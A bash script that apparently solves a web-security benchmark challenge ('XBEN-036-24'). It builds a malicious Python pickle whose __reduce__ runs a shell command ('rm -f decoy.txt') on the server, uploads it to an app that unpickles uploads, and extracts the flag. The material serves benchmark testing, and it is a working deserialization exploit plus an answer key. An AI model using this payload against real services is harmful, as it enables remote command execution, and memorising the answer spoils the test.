#!/usr/bin/env bash
# XBEN-036-24 — "Green pickle" (tags: insecure_deserialization)
#
# The page renders `decoy.txt` when it exists and `flag.txt` when it does not,
# and it will `pickle.loads` any file uploaded to it. Unpickling calls whatever
# `__reduce__` names, so the payload deletes the decoy and the next page load
# shows the real flag.
#
# The pickle is emitted at protocol 0, which is ASCII. Protocol 4 is smaller and
# would need base64 or a file to survive an argument list; h5i has no
# `--edits-file` yet, so the payload has to be text. That is a real limit and it
# is written down in the design (W8) rather than worked around silently.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben036-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

PICKLE="$(python3 -c "
import pickle, os
class Evil:
    def __reduce__(self):
        return (os.system, ('rm -f decoy.txt',))
print(pickle.dumps(Evil(), protocol=0).decode())")"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/' \
    --set "multipart.pickle_file=$PICKLE" \
    --set 'multipart.pickle_file.filename=p.pkl' \
    --set 'multipart.pickle_file.content_type=application/octet-stream' \
    --session "$SESSION" >/dev/null

"$H5I" browser navigate "$URL/" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
